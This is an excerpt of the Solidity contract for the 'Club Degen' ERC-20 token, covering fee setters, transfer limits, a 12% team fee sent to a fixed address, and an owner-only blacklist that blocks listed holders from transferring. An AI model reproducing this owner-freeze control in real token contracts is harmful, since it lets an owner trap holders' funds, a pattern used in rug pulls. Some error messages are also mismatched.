...
Web: https://clubdegen.online/
Tele: https://t.me/clubdegenportal
...
contract ClubDegen is Context, IERC20, Ownable {
    ...
    string private _name = "Club Degen";
    ...
    uint256 public _teamFee = 12;
    uint256 private _previousteamFee = _teamFee;
    uint256 public _maxTxAmount = 1000 * 10**6 * 10**18; 
    uint256 public _maxWalletSize = 2000 * 10**6 * 10**18;
    uint256 public _swapTokensAtAmount = 100 * 10**6 * 10**18;
    
    address public taxReceiver = address(0x5de9CE700bD44d62CBAa640a8f855427940De116);
    ...
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
        require(taxFee <= _taxFee, "Cannot set tax fees more than 5%.");
        _taxFee = taxFee;
    }

     function setBurnFeePercent(uint256 burnFee) external onlyOwner() {
         require(burnFee <= _burnFee, "Cannot set burn fees more than 5%.");
        _burnFee = burnFee;
    }
   
    function setTeamFeePercent(uint256 teamFee) external onlyOwner() {
         require(teamFee <= _teamFee, "Cannot set team fees more than 12%.");  
        _teamFee = teamFee;
    }

    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount > 500000000, "Max Tx Amount cannot be less than 500 million");
        _maxTxAmount = maxTxAmount * 10**18;
    }
    
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        require(maxTxPercent > 0, "Cannot set max tx percentage to 0.");  
        _maxTxAmount = _tTotal.mul(maxTxPercent).div(
            10**2
        );
    }

    function _setMaxWalletSizeAmount(uint256 maxWalletSize) external onlyOwner {
        require(maxWalletSize >= 500000000, "Max Tx Amount cannot be less than 500 million");
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner())
            ...
            require(!snipers[from] && !snipers[to], "Sorry, your account has been blacklisted.");
        ...
        if (takeFee) {
            if (to != uniswapV2Pair) {
                require(amount + balanceOf(to) <= _maxWalletSize, "Exceeded max wallet size");
            }
        }
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {        
        ...
        (bool succ, ) = address(taxReceiver).call{value: Balance}("");
    ...
    function blacklist(address[] memory sniper_) public onlyOwner {
        for (uint256 i = 0; i < sniper_.length; i++) {
            if (sniper_[i] != address(this) && sniper_[i] != uniswapV2Pair) {
                snipers[sniper_[i]] = true;
            }
        }
    }

    function unbracklist(address notSniper) public onlyOwner {
        snipers[notSniper] = false;
    }
